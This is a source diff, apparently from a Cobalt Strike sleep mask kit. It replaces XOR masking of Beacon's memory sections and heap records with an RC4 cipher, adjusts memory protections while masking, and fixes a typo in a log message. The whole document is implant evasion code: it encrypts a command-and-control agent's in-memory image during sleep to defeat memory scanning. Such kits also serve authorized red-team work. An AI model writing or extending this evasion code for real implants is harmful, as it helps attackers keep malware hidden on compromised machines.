@@ -9,13 +9,59 @@
 #include "..\debug.h"
 #include "..\sleepmask-vs.h"
 
+// ---------------------------------------------------------------------------
+// RC4-based beacon masking.
+//
+// RC4 is a stream cipher. Applying it twice with the same key and a freshly
+// initialized state restores the original plaintext, so encrypt == decrypt.
+// ---------------------------------------------------------------------------
+
+/**
+* Apply the RC4 cipher to the provided buffer in-place.
+*
+* @param buffer The buffer to encrypt/decrypt.
+* @param size   The size of the buffer in bytes.
+* @param key    The key to use.
+* @param keyLen The size of the key in bytes.
+*/
+void RC4Data(char* buffer, size_t size, char* key, size_t keyLen) {
+    if (buffer == NULL || key == NULL || keyLen == 0) {
+        return;
+    }
+
+    unsigned char S[256];
+
+    // KSA (Key Scheduling Algorithm)
+    for (int i = 0; i < 256; i++) {
+        S[i] = (unsigned char)i;
+    }
+    unsigned char j = 0;
+    for (int i = 0; i < 256; i++) {
+        j = j + S[i] + (unsigned char)key[i % keyLen];
+        unsigned char tmp = S[i];
+        S[i] = S[j];
+        S[j] = tmp;
+    }
+
+    // PRGA (Pseudo-Random Generation Algorithm) + XOR with keystream
+    unsigned char ii = 0, jj = 0;
+    for (size_t n = 0; n < size; n++) {
+        ii++;
+        jj = jj + S[ii];
+        unsigned char tmp = S[ii];
+        S[ii] = S[jj];
+        S[jj] = tmp;
+        buffer[n] ^= S[(unsigned char)(S[ii] + S[jj])];
+    }
+}
+
 /**
 * Mask Beacon
 *
 * @param beaconInfo A pointer to the BEACON_INFO structure
 */
 void MaskBeacon(BEACON_INFO* beaconInfo) {
-    XORBeacon(beaconInfo, TRUE);
+    RC4Beacon(beaconInfo, TRUE);
 
     return;
 }
@@ -26,18 +72,18 @@ void MaskBeacon(BEACON_INFO* beaconInfo) {
 * @param beaconInfo A pointer to the BEACON_INFO structure
 */
 void UnMaskBeacon(BEACON_INFO* beaconInfo) {
-    XORBeacon(beaconInfo, FALSE);
- 
+    RC4Beacon(beaconInfo, FALSE);
+
     return;
 }
 
 /**
-* XOR Beacon's Sections/Heap Records
+* RC4 Beacon's Sections/Heap Records
 *
 * @param beaconInfo A pointer to the BEACON_INFO structure
 * @param mask A Boolean value to indicate whether to mask/unmask Beacon
 */
-void XORBeacon(BEACON_INFO* beaconInfo, BOOL mask) {
+void RC4Beacon(BEACON_INFO* beaconInfo, BOOL mask) {
     // Determine which allocated memory region contains Beacon
     PALLOCATED_MEMORY_REGION beaconMemory = FindRegionByPurpose(&beaconInfo->allocatedMemory, PURPOSE_BEACON_MEMORY);
     if (beaconMemory == NULL) {
@@ -46,8 +92,8 @@ void XORBeacon(BEACON_INFO* beaconInfo, BOOL mask) {
     }
 
     // Mask/UnMask the memory
-    XORSections(beaconMemory, beaconInfo->mask, mask);
-    XORHeapRecords(beaconInfo);
+    RC4Sections(beaconMemory, beaconInfo->mask, mask);
+    RC4HeapRecords(beaconInfo);
 
     return;
 }
@@ -87,13 +133,14 @@ bool DripProtectSection(LPVOID baseAddress, SIZE_T size, DWORD protect, DWORD pa
 }
 
 /**
-* XOR the sections in the provided memory region
+* RC4-encrypt the sections in the provided memory region.
+* Handles VirtualProtect transitions for RX regions.
 *
 * @param allocatedRegion A pointer to a ALLOCATED_MEMORY_REGION structure
 * @param maskKey A pointer to the mask key
 * @param mask A Boolean value to indicate whether the function is masking/unmasking
 */
-void XORSections(PALLOCATED_MEMORY_REGION allocatedRegion, char* maskKey, BOOL mask) {
+void RC4Sections(PALLOCATED_MEMORY_REGION allocatedRegion, char* maskKey, BOOL mask) {
     DFR_LOCAL(KERNEL32, VirtualProtect);
     DWORD oldProtection = 0;
 
@@ -105,7 +152,7 @@ void XORSections(PALLOCATED_MEMORY_REGION allocatedRegion, char* maskKey, BOOL m
             continue;
         }
 
-        DLOGF("SLEEPMASK: %s Section - Address: %p\n", mask ? "Masking" : "Unmasking", allocatedRegion->Sections[i].BaseAddress);
+        DLOGF("SLEEPMASK: %s Section (RC4) - Address: %p\n", mask ? "Masking" : "Unmasking", allocatedRegion->Sections[i].BaseAddress);
         if (allocatedRegion->Sections[i].MaskSection == TRUE) {
             // Change protections on any RX regions if masking
             if (allocatedRegion->Sections[i].CurrentProtect == PAGE_EXECUTE_READ && mask == TRUE) {
@@ -133,9 +180,9 @@ void XORSections(PALLOCATED_MEMORY_REGION allocatedRegion, char* maskKey, BOOL m
                 allocatedRegion->Sections[i].PreviousProtect = oldProtection;
             }
 
-            // Mask the section, if section has WRITE permissions
+            // Apply RC4 cipher if section has WRITE permissions
             if (IsWritable(allocatedRegion->Sections[i].CurrentProtect)) {
-                XORData((char*)baseAddress, allocatedRegion->Sections[i].VirtualSize, maskKey, MASK_SIZE);
+                RC4Data((char*)baseAddress, allocatedRegion->Sections[i].VirtualSize, maskKey, MASK_SIZE);
             }
 
             // Restore original protections when unmasking
@@ -155,7 +202,7 @@ void XORSections(PALLOCATED_MEMORY_REGION allocatedRegion, char* maskKey, BOOL m
                 }
                 else {
                     if (!VirtualProtect(baseAddress, allocatedRegion->Sections[i].VirtualSize, allocatedRegion->Sections[i].PreviousProtect, &oldProtection)) {
-                        DLOG("Failed to restore oiginal protection on virtual memory, crash is likely.\n");
+                        DLOG("Failed to restore original protection on virtual memory, crash is likely.\n");
                         continue;
                     }
                 }
@@ -169,37 +216,17 @@ void XORSections(PALLOCATED_MEMORY_REGION allocatedRegion, char* maskKey, BOOL m
 }
 
 /**
-* XOR Heap Records
+* RC4-encrypt Heap Records
 *
 * @param beaconInfo A pointer to the BEACON_INFO structure
 */
-void XORHeapRecords(BEACON_INFO* beaconInfo) {
+void RC4HeapRecords(BEACON_INFO* beaconInfo) {
     DWORD heapRecord = 0;
     while (beaconInfo->heap_records[heapRecord].ptr != NULL) {
-        XORData(beaconInfo->heap_records[heapRecord].ptr, beaconInfo->heap_records[heapRecord].size, beaconInfo->mask, MASK_SIZE);
+        RC4Data(beaconInfo->heap_records[heapRecord].ptr, beaconInfo->heap_records[heapRecord].size, beaconInfo->mask, MASK_SIZE);
         heapRecord++;
     }
 
     return;
-}
-
-/**
-* XOR the provided buffer with the provided key
-*
-* @param buffer The buffer to XOR
-* @param size The size of the buffer
-* @param key The key to XOR the buffer
-* @param keyLength The size of the XOR key
-* @return A Boolean value to indicate success
-*/
-BOOL XORData(char* buffer, size_t size, char* key, size_t keyLength) {
-    if (buffer == NULL || key == NULL || keyLength == 0) {
-        return FALSE;
-    }
-
-    for (size_t index = 0; index < size; index++) {
-        buffer[index] ^= key[index % keyLength];
-    }
-    return TRUE;
 }
 
